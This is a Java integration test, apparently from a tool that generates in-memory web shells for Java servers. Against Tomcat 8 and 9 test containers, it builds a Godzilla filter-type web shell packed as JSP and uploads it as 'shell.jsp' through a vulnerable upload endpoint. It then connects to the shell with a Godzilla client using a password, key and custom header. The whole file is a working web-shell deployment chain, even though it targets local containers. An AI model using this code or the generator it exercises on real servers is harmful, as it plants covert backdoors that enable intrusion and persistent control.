package com.reajason.javaweb.memsell.tomcat.godzilla;

import com.reajason.javaweb.GeneratorMain;
import com.reajason.javaweb.config.GenerateResult;
import com.reajason.javaweb.config.GodzillaShellConfig;
import com.reajason.javaweb.config.Server;
import com.reajason.javaweb.config.ShellTool;
import com.reajason.javaweb.godzilla.GodzillaManager;
import com.reajason.javaweb.memsell.packer.JspPacker;
import com.reajason.javaweb.memsell.tomcat.TomcatShell;
import lombok.SneakyThrows;
import okhttp3.*;
import org.junit.jupiter.api.DynamicTest;
import org.junit.jupiter.api.TestFactory;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.containers.wait.strategy.Wait;
import org.testcontainers.utility.MountableFile;

import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.stream.Stream;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * @author ReaJason
 * @since 2024/11/26
 */
public class TomcatGodzillaIntegrationTest {
    OkHttpClient client = new OkHttpClient();

    @TestFactory
    Stream<DynamicTest> testContainerDeployments() {
        return Stream.of(
                createCustomContainerTest("tomcat:8-jre8"),
                createCustomContainerTest("tomcat:9-jre8")
        );
    }

    @SuppressWarnings("all")
    private DynamicTest createCustomContainerTest(String imageName) {
        Path warPath = Paths.get("../vul-webapp/build/libs/vul-webapp.war").toAbsolutePath();
        return DynamicTest.dynamicTest("Test " + imageName, () -> {
            try (GenericContainer<?> container = new GenericContainer<>(imageName)
                    .withCopyToContainer(MountableFile.forHostPath(warPath), "/usr/local/tomcat/webapps/app.war")
                    .waitingFor(Wait.forHttp("/app"))
                    .withExposedPorts(8080)) {
                container.start();
                String host = container.getHost();
                int port = container.getMappedPort(8080);
                String url = "http://" + host + ":" + port + "/app";
                GodzillaShellConfig shellConfig = GodzillaShellConfig.builder()
                        .pass("pass123").key("key123")
                        .headerName("User-Agent").headerValue("hello_integration_test")
                        .build();
                String jspContent = generateGodzillaFilterJsp(shellConfig);
                String filename = "shell.jsp";
                uploadJspFileToServer(url + "/upload", filename, jspContent);
                verifyContainerResponse(url + "/" + filename);

                testGodzillaIsOk(url + "/" + filename, shellConfig);
            }
        });
    }

    private String generateGodzillaFilterJsp(GodzillaShellConfig config) {
        Server server = Server.TOMCAT;
        ShellTool shellTool = ShellTool.Godzilla;
        String shellType = TomcatShell.FILTER;
        GenerateResult generateResult = GeneratorMain.generate(server, shellTool, shellType, config);
        JspPacker jspPacker = new JspPacker();
        return new String(jspPacker.pack(generateResult));
    }

    private void verifyContainerResponse(String url) throws IOException {
        Request request = new Request.Builder()
                .url(url).build();
        try (Response response = client.newCall(request).execute()) {
            assertEquals(200, response.code());
        }
    }


    @SneakyThrows
    private void uploadJspFileToServer(String uploadUrl, String filename, String fileContent) {
        RequestBody fileRequestBody = RequestBody.create(fileContent, MediaType.parse("text/plain"));
        MultipartBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", filename, fileRequestBody)
                .build();
        Request request = new Request.Builder()
                .url(uploadUrl).post(requestBody)
                .build();
        try (Response response = client.newCall(request).execute()) {
            assertEquals(200, response.code());
        }
    }

    private void testGodzillaIsOk(String entrypoint, GodzillaShellConfig shellConfig) {
        try (GodzillaManager godzillaManager = GodzillaManager.builder()
                .entrypoint(entrypoint)
                .pass(shellConfig.getPass())
                .key(shellConfig.getKey())
                .header(shellConfig.getHeaderName(), shellConfig.getHeaderValue()).build()) {
            assertTrue(godzillaManager.start());
            assertTrue(godzillaManager.test());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
